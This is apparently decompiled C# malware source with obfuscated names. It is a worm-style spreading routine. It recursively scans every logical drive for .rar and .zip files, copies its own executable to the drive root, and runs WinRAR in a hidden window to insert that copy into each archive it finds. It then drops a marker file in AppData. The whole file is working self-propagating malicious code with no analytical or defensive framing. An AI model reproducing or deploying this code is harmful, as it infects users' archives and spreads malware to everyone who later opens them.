using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class11
{
	private static string string_0;

	private static string string_1;

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string string_2, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, int int_0);

	private static void smethod_0(string string_2)
	{
		try
		{
			string[] files = Directory.GetFiles(string_2);
			string[] array = files;
			foreach (string text in array)
			{
				if (text.Contains(".rar"))
				{
					smethod_1(text);
				}
				if (text.Contains(".zip"))
				{
					smethod_1(text);
				}
			}
			string[] directories = Directory.GetDirectories(string_2);
			string[] array2 = directories;
			foreach (string string_3 in array2)
			{
				smethod_0(string_3);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void HdgGlnubf(string string_2)
	{
		string_1 = string_2;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string string_3 in array)
		{
			smethod_0(string_3);
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt");
	}

	public static void smethod_1(string string_2)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(string_0))
		{
			if (!File.Exists(Path.Combine(path, string_1)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, string_1));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			GetShortPathName(Path.Combine(path, string_1), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			StringBuilder stringBuilder2 = new StringBuilder(255);
			GetShortPathName(string_2, stringBuilder2, stringBuilder2.Capacity);
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = " a " + stringBuilder2.ToString() + " " + text;
				processStartInfo.FileName = string_0;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
